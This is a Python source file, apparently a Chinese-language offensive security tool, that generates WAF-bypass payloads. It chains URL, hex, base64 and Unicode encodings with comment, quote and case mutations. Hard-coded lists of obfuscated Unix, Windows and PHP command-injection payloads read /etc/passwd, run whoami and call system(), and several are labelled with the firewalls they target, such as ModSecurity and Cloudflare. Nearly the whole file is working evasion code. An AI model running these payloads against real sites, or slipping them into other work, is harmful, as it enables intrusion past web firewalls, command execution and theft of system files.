"""
WAF绕过Payload生成器
支持多种编码、混淆和变异技术
"""

import base64
import urllib.parse
import random
import string
import re
from typing import List, Dict, Optional, Tuple, Callable
from dataclasses import dataclass
from enum import Enum


class WAFTechnique(Enum):
    URL_ENCODING = "url_encoding"
    DOUBLE_URL_ENCODING = "double_url_encoding"
    BASE64_ENCODING = "base64_encoding"
    UNICODE_ENCODING = "unicode_encoding"
    HTML_ENTITY = "html_entity"
    HEX_ENCODING = "hex_encoding"
    OCTAL_ENCODING = "octal_encoding"
    COMMENT_OBFUSCATION = "comment_obfuscation"
    CASE_MANIPULATION = "case_manipulation"
    NULL_BYTE = "null_byte"
    WHITESPACE_VARIATION = "whitespace_variation"
    QUOTE_MANIPULATION = "quote_manipulation"
    CONCATENATION = "concatenation"
    VARIABLE_SUBSTITUTION = "variable_substitution"
    PATH_OBFUSCATION = "path_obfuscation"


@dataclass
class BypassPayload:
    original: str
    payload: str
    technique: WAFTechnique
    description: str
    target_waf: List[str]


class WAFBypassGenerator:
    """WAF绕过Payload生成器"""
    
    WAF_SIGNATURES = {
        "modsecurity": ["ModSecurity", "OWASP CRS"],
        "cloudflare": ["cloudflare", "cf-ray"],
        "akamai": ["akamai"],
        "imperva": ["imperva", "incapsula"],
        "f5": ["F5", "BIG-IP"],
        "barracuda": ["barracuda"],
        "fortinet": ["fortinet", "fortiweb"],
        "sucuri": ["sucuri"],
        "wordfence": ["wordfence"],
        "generic": []
    }
    
    def __init__(self):
        self.mutation_rules = self._init_mutation_rules()
        self.encoding_chain = self._init_encoding_chain()
    
    def _init_mutation_rules(self) -> Dict[str, List[Callable]]:
        """初始化变异规则库"""
        return {
            "command_injection": [
                self._mutate_command_separators,
                self._mutate_command_substitution,
                self._mutate_pipe_operators,
                self._mutate_redirection,
            ],
            "php_injection": [
                self._mutate_php_functions,
                self._mutate_php_variables,
                self._mutate_php_strings,
            ],
            "sql_injection": [
                self._mutate_sql_keywords,
                self._mutate_sql_comments,
                self._mutate_sql_strings,
            ],
            "template_injection": [
                self._mutate_template_syntax,
            ]
        }
    
    def _init_encoding_chain(self) -> List[List[WAFTechnique]]:
        """初始化编码链组合"""
        return [
            [WAFTechnique.URL_ENCODING],
            [WAFTechnique.DOUBLE_URL_ENCODING],
            [WAFTechnique.BASE64_ENCODING],
            [WAFTechnique.UNICODE_ENCODING],
            [WAFTechnique.URL_ENCODING, WAFTechnique.CASE_MANIPULATION],
            [WAFTechnique.COMMENT_OBFUSCATION, WAFTechnique.URL_ENCODING],
            [WAFTechnique.NULL_BYTE, WAFTechnique.URL_ENCODING],
            [WAFTechnique.HEX_ENCODING],
            [WAFTechnique.OCTAL_ENCODING],
            [WAFTechnique.HTML_ENTITY],
            [WAFTechnique.WHITESPACE_VARIATION],
            [WAFTechnique.QUOTE_MANIPULATION],
        ]
    
    def url_encode(self, payload: str, double: bool = False) -> str:
        """URL编码"""
        if double:
            return urllib.parse.quote(urllib.parse.quote(payload, safe=''), safe='')
        return urllib.parse.quote(payload, safe='')
    
    def base64_encode(self, payload: str) -> str:
        """Base64编码"""
        return base64.b64encode(payload.encode()).decode()
    
    def unicode_encode(self, payload: str) -> str:
        """Unicode编码"""
        result = ""
        for char in payload:
            if char.isascii() and char.isalnum():
                result += char
            else:
                result += f"\\u{ord(char):04x}"
        return result
    
    def hex_encode(self, payload: str) -> str:
        """十六进制编码"""
        return ''.join(f'\\x{ord(c):02x}' for c in payload)
    
    def octal_encode(self, payload: str) -> str:
        """八进制编码"""
        return ''.join(f'\\{ord(c):03o}' for c in payload)
    
    def html_entity_encode(self, payload: str) -> str:
        """HTML实体编码"""
        result = ""
        for char in payload:
            if char.isalnum():
                result += char
            else:
                result += f"&#x{ord(char):x};"
        return result
    
    def insert_comments(self, payload: str, comment_style: str = "c") -> str:
        """插入注释混淆"""
        if comment_style == "c":
            comment = f"/*{''.join(random.choices(string.ascii_letters, k=random.randint(3,8)))}*/"
        elif comment_style == "sql":
            comment = f"/**/"
        elif comment_style == "html":
            comment = f"<!--{''.join(random.choices(string.ascii_letters, k=random.randint(3,5)))}-->"
        else:
            comment = "/**/"
        
        result = ""
        for i, char in enumerate(payload):
            result += char
            if random.random() < 0.3 and char not in [' ', '\n', '\t']:
                result += comment
        return result
    
    def case_manipulation(self, payload: str) -> str:
        """大小写变换"""
        result = ""
        for char in payload:
            if char.isalpha():
                result += char.upper() if random.random() < 0.5 else char.lower()
            else:
                result += char
        return result
    
    def insert_null_bytes(self, payload: str) -> str:
        """插入空字节"""
        result = ""
        for char in payload:
            if random.random() < 0.2:
                result += "%00"
            result += char
        return result
    
    def whitespace_variation(self, payload: str) -> str:
        """空白字符变换"""
        whitespace_chars = [' ', '\t', '\n', '\r', '\v', '\f', '%09', '%0a', '%0d', '%20']
        result = ""
        for char in payload:
            if char == ' ':
                result += random.choice(whitespace_chars)
            else:
                result += char
        return result
    
    def quote_manipulation(self, payload: str) -> str:
        """引号变换"""
        quote_chars = ["'", '"', '`', "'", '"', '´', 'ʹ', 'ʺ']
        result = ""
        for char in payload:
            if char in ["'", '"']:
                result += random.choice(quote_chars)
            else:
                result += char
        return result
    
    def _mutate_command_separators(self, payload: str) -> List[str]:
        """命令分隔符变异"""
        separators = [';', '|', '||', '&&', '&', '\n', '\r\n', '%0a', '%0d%0a']
        results = []
        for sep in separators:
            mutated = re.sub(r'[;&|]', sep, payload)
            if mutated != payload:
                results.append(mutated)
        return results
    
    def _mutate_command_substitution(self, payload: str) -> List[str]:
        """命令替换变异"""
        results = []
        if '$(' in payload or '`' in payload:
            if '$(' in payload:
                mutated = payload.replace('$(', '`').replace(')', '`')
                results.append(mutated)
            if '`' in payload:
                mutated = payload.replace('`', '$(').replace('`', ')')
                results.append(mutated)
        return results
    
    def _mutate_pipe_operators(self, payload: str) -> List[str]:
        """管道操作符变异"""
        results = []
        pipe_variants = ['|', '||', '%7c', '%7c%7c']
        for variant in pipe_variants:
            if '|' in payload:
                mutated = payload.replace('|', variant)
                results.append(mutated)
        return results
    
    def _mutate_redirection(self, payload: str) -> List[str]:
        """重定向变异"""
        results = []
        redirect_patterns = [
            ('>', '%3e'),
            ('>>', '%3e%3e'),
            ('<', '%3c'),
            ('2>', '%32%3e'),
            ('&>', '%26%3e'),
        ]
        for original, replacement in redirect_patterns:
            if original in payload:
                results.append(payload.replace(original, replacement))
        return results
    
    def _mutate_php_functions(self, payload: str) -> List[str]:
        """PHP函数名变异"""
        results = []
        php_functions = ['system', 'exec', 'shell_exec', 'passthru', 'popen', 'proc_open']
        
        for func in php_functions:
            if func in payload.lower():
                case_variants = [
                    func.upper(),
                    func.capitalize(),
                    ''.join(c.upper() if i % 2 == 0 else c for i, c in enumerate(func)),
                ]
                for variant in case_variants:
                    results.append(re.sub(func, variant, payload, flags=re.IGNORECASE))
                
                comment_variant = func[0] + '/**/' + func[1:]
                results.append(re.sub(func, comment_variant, payload, flags=re.IGNORECASE))
        
        return results
    
    def _mutate_php_variables(self, payload: str) -> List[str]:
        """PHP变量变异"""
        results = []
        
        if '$' in payload:
            results.append(payload.replace('$', '${'))
            results.append(payload.replace('$', '$$'))
        
        return results
    
    def _mutate_php_strings(self, payload: str) -> List[str]:
        """PHP字符串变异"""
        results = []
        
        string_patterns = [
            ("'", '"'),
            ('"', "'"),
        ]
        
        for old, new in string_patterns:
            if old in payload:
                results.append(payload.replace(old, new))
        
        if "'" in payload or '"' in payload:
            results.append(self.insert_comments(payload, "c"))
        
        return results
    
    def _mutate_sql_keywords(self, payload: str) -> List[str]:
        """SQL关键字变异"""
        results = []
        sql_keywords = ['SELECT', 'UNION', 'INSERT', 'UPDATE', 'DELETE', 'DROP', 'OR', 'AND']
        
        for keyword in sql_keywords:
            pattern = re.compile(keyword, re.IGNORECASE)
            if pattern.search(payload):
                case_variant = ''.join(c.upper() if i % 2 == 0 else c.lower() 
                                       for i, c in enumerate(keyword))
                results.append(pattern.sub(case_variant, payload))
                
                comment_variant = keyword[0] + '/**/' + keyword[1:]
                results.append(pattern.sub(comment_variant, payload))
        
        return results
    
    def _mutate_sql_comments(self, payload: str) -> List[str]:
        """SQL注释变异"""
        results = []
        
        if ' ' in payload:
            results.append(payload.replace(' ', '/**/'))
            results.append(payload.replace(' ', '%20'))
            results.append(payload.replace(' ', '+'))
        
        return results
    
    def _mutate_sql_strings(self, payload: str) -> List[str]:
        """SQL字符串变异"""
        results = []
        
        concat_variants = [
            ("' OR '", "'/**/OR/**/'"),
            ("' AND '", "'/**/AND/**/'"),
        ]
        
        for original, replacement in concat_variants:
            if original.upper() in payload.upper():
                results.append(re.sub(original, replacement, payload, flags=re.IGNORECASE))
        
        return results
    
    def _mutate_template_syntax(self, payload: str) -> List[str]:
        """模板注入语法变异"""
        results = []
        
        if '{{' in payload:
            results.append(payload.replace('{{', '${'))
            results.append(payload.replace('{{', '#{'))
            results.append(payload.replace('{{', '<%'))
        
        if '${' in payload:
            results.append(payload.replace('${', '{{'))
            results.append(payload.replace('${', '#{'))
        
        return results
    
    def generate_bypass_payloads(self, original_payload: str, 
                                  max_variants: int = 20) -> List[BypassPayload]:
        """生成绕过Payload变体"""
        variants = []
        seen = {original_payload}
        
        for encoding_chain in self.encoding_chain:
            payload = original_payload
            for technique in encoding_chain:
                payload = self._apply_technique(payload, technique)
            
            if payload not in seen:
                seen.add(payload)
                variants.append(BypassPayload(
                    original=original_payload,
                    payload=payload,
                    technique=encoding_chain[0],
                    description=f"编码链: {' -> '.join(t.value for t in encoding_chain)}",
                    target_waf=["generic"]
                ))
        
        for category, rules in self.mutation_rules.items():
            for rule in rules:
                try:
                    mutated_list = rule(original_payload)
                    for mutated in mutated_list[:3]:
                        if mutated not in seen:
                            seen.add(mutated)
                            variants.append(BypassPayload(
                                original=original_payload,
                                payload=mutated,
                                technique=WAFTechnique.COMMENT_OBFUSCATION,
                                description=f"变异规则: {rule.__name__}",
                                target_waf=["generic"]
                            ))
                except Exception:
                    pass
        
        return variants[:max_variants]
    
    def _apply_technique(self, payload: str, technique: WAFTechnique) -> str:
        """应用单个绕过技术"""
        technique_map = {
            WAFTechnique.URL_ENCODING: lambda p: self.url_encode(p),
            WAFTechnique.DOUBLE_URL_ENCODING: lambda p: self.url_encode(p, double=True),
            WAFTechnique.BASE64_ENCODING: lambda p: self.base64_encode(p),
            WAFTechnique.UNICODE_ENCODING: lambda p: self.unicode_encode(p),
            WAFTechnique.HEX_ENCODING: lambda p: self.hex_encode(p),
            WAFTechnique.OCTAL_ENCODING: lambda p: self.octal_encode(p),
            WAFTechnique.HTML_ENTITY: lambda p: self.html_entity_encode(p),
            WAFTechnique.COMMENT_OBFUSCATION: lambda p: self.insert_comments(p),
            WAFTechnique.CASE_MANIPULATION: lambda p: self.case_manipulation(p),
            WAFTechnique.NULL_BYTE: lambda p: self.insert_null_bytes(p),
            WAFTechnique.WHITESPACE_VARIATION: lambda p: self.whitespace_variation(p),
            WAFTechnique.QUOTE_MANIPULATION: lambda p: self.quote_manipulation(p),
        }
        
        handler = technique_map.get(technique)
        if handler:
            return handler(payload)
        return payload
    
    def generate_unix_bypass_payloads(self) -> List[BypassPayload]:
        """生成Unix命令注入绕过Payload"""
        base_payloads = [
            "; ls;",
            "; whoami;",
            "; id;",
            "| ls",
            "| whoami",
            "`ls`",
            "$(ls)",
            "; cat /etc/passwd;",
        ]
        
        all_variants = []
        for payload in base_payloads:
            variants = self.generate_bypass_payloads(payload, max_variants=10)
            all_variants.extend(variants)
        
        special_bypasses = [
            BypassPayload(
                original="; ls;",
                payload=";{ls,};",
                technique=WAFTechnique.PATH_OBFUSCATION,
                description="大括号扩展绕过",
                target_waf=["modsecurity", "generic"]
            ),
            BypassPayload(
                original="; ls;",
                payload="; l''s;",
                technique=WAFTechnique.QUOTE_MANIPULATION,
                description="引号分割绕过",
                target_waf=["cloudflare", "generic"]
            ),
            BypassPayload(
                original="; ls;",
                payload="; l\\s;",
                technique=WAFTechnique.PATH_OBFUSCATION,
                description="反斜杠转义绕过",
                target_waf=["generic"]
            ),
            BypassPayload(
                original="; ls;",
                payload="; l$@s;",
                technique=WAFTechnique.VARIABLE_SUBSTITUTION,
                description="特殊变量绕过",
                target_waf=["modsecurity", "generic"]
            ),
            BypassPayload(
                original="; ls;",
                payload="; l${PATH:0:0}s;",
                technique=WAFTechnique.VARIABLE_SUBSTITUTION,
                description="变量切片绕过",
                target_waf=["generic"]
            ),
            BypassPayload(
                original="; ls;",
                payload="; l${IFS}s;",
                technique=WAFTechnique.VARIABLE_SUBSTITUTION,
                description="IFS变量绕过",
                target_waf=["generic"]
            ),
            BypassPayload(
                original="; ls;",
                payload=";$(printf'\\x6c\\x73');",
                technique=WAFTechnique.HEX_ENCODING,
                description="printf十六进制绕过",
                target_waf=["cloudflare", "generic"]
            ),
            BypassPayload(
                original="; ls;",
                payload=";$(echo'bHM='|base64-d);",
                technique=WAFTechnique.BASE64_ENCODING,
                description="base64解码绕过",
                target_waf=["generic"]
            ),
            BypassPayload(
                original="; ls;",
                payload="%0als",
                technique=WAFTechnique.URL_ENCODING,
                description="换行符URL编码绕过",
                target_waf=["generic"]
            ),
            BypassPayload(
                original="; whoami;",
                payload="; w${PATH:0:0}hoami;",
                technique=WAFTechnique.VARIABLE_SUBSTITUTION,
                description="whoami变量切片绕过",
                target_waf=["generic"]
            ),
            BypassPayload(
                original="; whoami;",
                payload="; {whoami,};",
                technique=WAFTechnique.PATH_OBFUSCATION,
                description="whoami大括号绕过",
                target_waf=["generic"]
            ),
            BypassPayload(
                original="; whoami;",
                payload="; wh\\oami;",
                technique=WAFTechnique.PATH_OBFUSCATION,
                description="whoami反斜杠绕过",
                target_waf=["generic"]
            ),
            BypassPayload(
                original="; whoami;",
                payload="; wh''oami;",
                technique=WAFTechnique.QUOTE_MANIPULATION,
                description="whoami引号绕过",
                target_waf=["generic"]
            ),
            BypassPayload(
                original="; cat /etc/passwd;",
                payload="; c'a't /e'tc'/p'a'sswd;",
                technique=WAFTechnique.QUOTE_MANIPULATION,
                description="cat引号分割绕过",
                target_waf=["generic"]
            ),
            BypassPayload(
                original="; cat /etc/passwd;",
                payload="; c\\at /e\\tc/p\\asswd;",
                technique=WAFTechnique.PATH_OBFUSCATION,
                description="cat反斜杠绕过",
                target_waf=["generic"]
            ),
            BypassPayload(
                original="; cat /etc/passwd;",
                payload="; /???/??t /???/p??s??;",
                technique=WAFTechnique.PATH_OBFUSCATION,
                description="通配符绕过",
                target_waf=["modsecurity", "cloudflare", "generic"]
            ),
            BypassPayload(
                original="; cat /etc/passwd;",
                payload="; /bin/c[a]t /etc/p[a]sswd;",
                technique=WAFTechnique.PATH_OBFUSCATION,
                description="中括号通配符绕过",
                target_waf=["generic"]
            ),
        ]
        
        all_variants.extend(special_bypasses)
        return all_variants
    
    def generate_windows_bypass_payloads(self) -> List[BypassPayload]:
        """生成Windows命令注入绕过Payload"""
        base_payloads = [
            "& dir",
            "& whoami",
            "| dir",
            "| whoami",
        ]
        
        all_variants = []
        for payload in base_payloads:
            variants = self.generate_bypass_payloads(payload, max_variants=10)
            all_variants.extend(variants)
        
        special_bypasses = [
            BypassPayload(
                original="& dir",
                payload="& d^ir",
                technique=WAFTechnique.PATH_OBFUSCATION,
                description="Windows脱字符绕过",
                target_waf=["generic"]
            ),
            BypassPayload(
                original="& whoami",
                payload="& w^hoami",
                technique=WAFTechnique.PATH_OBFUSCATION,
                description="whoami脱字符绕过",
                target_waf=["generic"]
            ),
            BypassPayload(
                original="& dir",
                payload="& di''r",
                technique=WAFTechnique.QUOTE_MANIPULATION,
                description="Windows引号绕过",
                target_waf=["generic"]
            ),
            BypassPayload(
                original="& whoami",
                payload="& who''ami",
                technique=WAFTechnique.QUOTE_MANIPULATION,
                description="whoami引号绕过",
                target_waf=["generic"]
            ),
            BypassPayload(
                original="& dir",
                payload="& set /a=dir&call %a%",
                technique=WAFTechnique.VARIABLE_SUBSTITUTION,
                description="变量调用绕过",
                target_waf=["generic"]
            ),
            BypassPayload(
                original="& dir",
                payload="& for /f \"delims=\" %a in ('cmd /c echo dir') do %a",
                technique=WAFTechnique.CONCATENATION,
                description="for循环绕过",
                target_waf=["generic"]
            ),
            BypassPayload(
                original="& whoami",
                payload="& c^m^d /c whoami",
                technique=WAFTechnique.PATH_OBFUSCATION,
                description="cmd脱字符绕过",
                target_waf=["generic"]
            ),
            BypassPayload(
                original="& dir",
                payload="& p^o^w^e^r^s^h^e^l^l dir",
                technique=WAFTechnique.PATH_OBFUSCATION,
                description="powershell脱字符绕过",
                target_waf=["generic"]
            ),
        ]
        
        all_variants.extend(special_bypasses)
        return all_variants
    
    def generate_php_bypass_payloads(self) -> List[BypassPayload]:
        """生成PHP代码执行绕过Payload"""
        base_payloads = [
            "system('ls');",
            "exec('ls');",
            "shell_exec('ls');",
            "passthru('ls');",
            "eval('system(\"ls\");');",
        ]
        
        all_variants = []
        for payload in base_payloads:
            variants = self.generate_bypass_payloads(payload, max_variants=10)
            all_variants.extend(variants)
        
        special_bypasses = [
            BypassPayload(
                original="system('ls');",
                payload="sYsTeM('ls');",
                technique=WAFTechnique.CASE_MANIPULATION,
                description="PHP函数大小写绕过",
                target_waf=["generic"]
            ),
            BypassPayload(
                original="system('ls');",
                payload="sys/**/tem('ls');",
                technique=WAFTechnique.COMMENT_OBFUSCATION,
                description="PHP注释分割绕过",
                target_waf=["modsecurity", "generic"]
            ),
            BypassPayload(
                original="system('ls');",
                payload="(system)('ls');",
                technique=WAFTechnique.PATH_OBFUSCATION,
                description="PHP括号绕过",
                target_waf=["generic"]
            ),
            BypassPayload(
                original="system('ls');",
                payload="define('x','system');x('ls');",
                technique=WAFTechnique.VARIABLE_SUBSTITUTION,
                description="PHP动态函数绕过",
                target_waf=["generic"]
            ),
            BypassPayload(
                original="system('ls');",
                payload="$a='sys';$b='tem';$a.$b('ls');",
                technique=WAFTechnique.CONCATENATION,
                description="PHP字符串拼接绕过",
                target_waf=["generic"]
            ),
            BypassPayload(
                original="system('ls');",
                payload="call_user_func('system','ls');",
                technique=WAFTechnique.VARIABLE_SUBSTITUTION,
                description="PHP回调函数绕过",
                target_waf=["generic"]
            ),
            BypassPayload(
                original="system('ls');",
                payload="array_map('system',array('ls'));",
                technique=WAFTechnique.VARIABLE_SUBSTITUTION,
                description="PHP array_map绕过",
                target_waf=["generic"]
            ),
            BypassPayload(
                original="system('ls');",
                payload="assert('system(\"ls\")');",
                technique=WAFTechnique.VARIABLE_SUBSTITUTION,
                description="PHP assert绕过",
                target_waf=["generic"]
            ),
            BypassPayload(
                original="system('ls');",
                payload="create_function('','system(\"ls\");')();",
                technique=WAFTechnique.VARIABLE_SUBSTITUTION,
                description="PHP create_function绕过",
                target_waf=["generic"]
            ),
            BypassPayload(
                original="system('ls');",
                payload="preg_replace('/.*/e','system(\"ls\")','');",
                technique=WAFTechnique.VARIABLE_SUBSTITUTION,
                description="PHP preg_replace /e绕过",
                target_waf=["generic"]
            ),
            BypassPayload(
                original="system('ls');",
                payload="$_GET[0]($_GET[1]);&0=system&1=ls",
                technique=WAFTechnique.VARIABLE_SUBSTITUTION,
                description="PHP变量函数绕过",
                target_waf=["generic"]
            ),
            BypassPayload(
                original="system('ls');",
                payload="var_dump(`ls`);",
                technique=WAFTechnique.VARIABLE_SUBSTITUTION,
                description="PHP反引号执行绕过",
                target_waf=["generic"]
            ),
            BypassPayload(
                original="system('ls');",
                payload="echo `ls`;",
                technique=WAFTechnique.VARIABLE_SUBSTITUTION,
                description="PHP echo反引号绕过",
                target_waf=["generic"]
            ),
            BypassPayload(
                original="system('ls');",
                payload="print shell_exec('ls');",
                technique=WAFTechnique.VARIABLE_SUBSTITUTION,
                description="PHP print绕过",
                target_waf=["generic"]
            ),
        ]
        
        all_variants.extend(special_bypasses)
        return all_variants
    
    def get_all_bypass_payloads(self) -> List[BypassPayload]:
        """获取所有绕过Payload"""
        all_payloads = []
        all_payloads.extend(self.generate_unix_bypass_payloads())
        all_payloads.extend(self.generate_windows_bypass_payloads())
        all_payloads.extend(self.generate_php_bypass_payloads())
        return all_payloads
